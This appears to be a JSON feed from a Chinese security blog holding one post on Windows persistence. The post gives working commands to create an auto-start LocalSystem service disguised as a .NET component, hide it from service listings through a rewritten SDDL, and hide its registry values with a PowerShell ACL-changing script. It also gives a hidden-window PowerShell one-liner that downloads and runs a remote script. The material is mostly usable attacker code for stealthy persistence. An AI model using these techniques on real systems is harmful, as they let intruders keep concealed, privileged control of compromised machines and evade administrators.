{
    "version": "https://jsonfeed.org/version/1",
    "title": "竹林寺 • All posts by \"命令\" category",
    "description": "请我喝咖啡！ψ(｀∇´)ψ",
    "home_page_url": "https://zlte.netlify.app",
    "items": [
        {
            "id": "https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "url": "https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/",
            "title": "win权限维持/安全描述符权限维持",
            "date_published": "2024-01-21T16:30:34.000Z",
            "content_html": "<p><strong>竹林寺</strong></p>\n<p><strong>cmd powershell 选其一</strong></p>\n<h2 id=\"1cmd创建自启动服务\"><a class=\"anchor\" href=\"#1cmd创建自启动服务\">#</a> 1.cmd 创建自启动服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc create <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> <span class=\"token assign-left variable\">binpath</span><span class=\"token operator\">=</span> <span class=\"token string\">\"cmd.exe /k C:<span class=\"token entity\" title=\"\\t\">\\t</span>est.txt\"</span> <span class=\"token assign-left variable\">depend</span><span class=\"token operator\">=</span> Tcpip <span class=\"token assign-left variable\">obj</span><span class=\"token operator\">=</span> Localsystem <span class=\"token assign-left variable\">start</span><span class=\"token operator\">=</span> auto</pre></td></tr></table></figure><h2 id=\"2-powershell创建自启动服务\"><a class=\"anchor\" href=\"#2-powershell创建自启动服务\">#</a> 2. powershell 创建自启动服务</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">new-service</span> –Name <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –DisplayName <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –BinaryPathName <span class=\"token string\">\"cmd.exe /k C:\\test.txt\"</span> – StartupType AutomaticDelayedStart  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function\">new-service</span> –Name <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –DisplayName <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> –BinaryPathName <span class=\"token string\">\"cmd.exe /k C:\\test.txt\"</span> –StartupType AutomaticDelayedStart</pre></td></tr></table></figure><h2 id=\"3-通过修改sddl安全描述符隐藏服务\"><a class=\"anchor\" href=\"#3-通过修改sddl安全描述符隐藏服务\">#</a> 3. 通过修改 SDDL (安全描述符) 隐藏服务</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc sdset <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> <span class=\"token string\">\"D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"</span></pre></td></tr></table></figure><h2 id=\"4-然后通过sc与get-server查找服务均无结果\"><a class=\"anchor\" href=\"#4-然后通过sc与get-server查找服务均无结果\">#</a> 4. 然后通过 sc 与 get-server 查找服务均无结果：</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sc query <span class=\"token operator\">|</span>findstr <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>get-service <span class=\"token operator\">|</span> findstr <span class=\"token string\">\".NET CLR Networking 3.5.0.0\"</span></pre></td></tr></table></figure><p><img data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_1.png\" alt=\"image\" /></p>\n<h2 id=\"5-但这样做有一个问题在注册表中很容易看到异常value\"><a class=\"anchor\" href=\"#5-但这样做有一个问题在注册表中很容易看到异常value\">#</a> 5. 但这样做有一个问题：在注册表中很容易看到异常 value。</h2>\n<p><img data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_2.png\" alt=\"image.png\" /></p>\n<h2 id=\"6-修改注册表acl\"><a class=\"anchor\" href=\"#6-修改注册表acl\">#</a> 6. 修改注册表 ACL</h2>\n<p><strong>我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。</strong><br />\n** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> Server-Sddl-Change<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token namespace\">[CmdletBinding()]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">param</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token namespace\">[parameter(Mandatory=$false)]</span><span class=\"token namespace\">[String]</span><span class=\"token variable\">$Name</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$ROOT</span> = <span class=\"token string\">\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$S</span> = <span class=\"token variable\">$ROOT</span><span class=\"token operator\">+</span><span class=\"token variable\">$NAME</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$acl</span> = <span class=\"token function\">Get-Acl</span> <span class=\"token variable\">$S</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>SetAccessRuleProtection<span class=\"token punctuation\">(</span><span class=\"token boolean\">$true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">$false</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$person</span> = <span class=\"token namespace\">[System.Security.Principal.NTAccount]</span><span class=\"token string\">\"Everyone\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$access</span> = <span class=\"token namespace\">[System.Security.AccessControl.RegistryRights]</span><span class=\"token string\">\"QueryValues\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$inheritance</span> = <span class=\"token namespace\">[System.Security.AccessControl.InheritanceFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$propagation</span> = <span class=\"token namespace\">[System.Security.AccessControl.PropagationFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$type</span> = <span class=\"token namespace\">[System.Security.AccessControl.AccessControlType]</span><span class=\"token string\">\"Deny\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$rule</span> = <span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>Security<span class=\"token punctuation\">.</span>AccessControl<span class=\"token punctuation\">.</span>RegistryAccessRule<span class=\"token punctuation\">(</span> `</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$person</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$access</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inheritance</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$propagation</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>AddAccessRule<span class=\"token punctuation\">(</span><span class=\"token variable\">$rule</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$person</span> = <span class=\"token namespace\">[System.Security.Principal.NTAccount]</span><span class=\"token string\">\"Everyone\"</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$access</span> =</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token namespace\">[System.Security.AccessControl.RegistryRights]</span><span class=\"token string\">\"SetValue,CreateSubKey,EnumerateSu</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ePermissions,TakeOwnership\"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$inheritance</span> = <span class=\"token namespace\">[System.Security.AccessControl.InheritanceFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token variable\">$propagation</span> = <span class=\"token namespace\">[System.Security.AccessControl.PropagationFlags]</span><span class=\"token string\">\"None\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token variable\">$type</span> = <span class=\"token namespace\">[System.Security.AccessControl.AccessControlType]</span><span class=\"token string\">\"Allow\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$rule</span> = <span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>Security<span class=\"token punctuation\">.</span>AccessControl<span class=\"token punctuation\">.</span>RegistryAccessRule<span class=\"token punctuation\">(</span> `</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$person</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$access</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$inheritance</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$propagation</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$acl</span><span class=\"token punctuation\">.</span>AddAccessRule<span class=\"token punctuation\">(</span><span class=\"token variable\">$rule</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">Set-Acl</span> <span class=\"token variable\">$S</span> <span class=\"token variable\">$acl</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"7-远程加载powershell脚本\"><a class=\"anchor\" href=\"#7-远程加载powershell脚本\">#</a> 7. 远程加载 powershell 脚本：</h2>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>powershell<span class=\"token punctuation\">.</span>exe <span class=\"token operator\">-</span>exec bypass <span class=\"token operator\">-</span>nop <span class=\"token operator\">-</span>w hidden <span class=\"token operator\">-</span>c \"<span class=\"token function\">IEX</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">new-object</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>net<span class=\"token punctuation\">.</span>webclient<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>downloadstring<span class=\"token punctuation\">(</span><span class=\"token string\">'http://192.168.0.149/1.ps1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>Server-Sddl-Change <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Name <span class=\"token string\">'.NET CLR Networking 3.5.0.0'</span></pre></td></tr></table></figure><h2 id=\"8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\"><a class=\"anchor\" href=\"#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏\">#</a> 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：</h2>\n<p><img data-src=\"https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_3.png\" alt=\"image.png\" /></p>\n",
            "tags": [
                "权限维持"
            ]
        }
    ]
}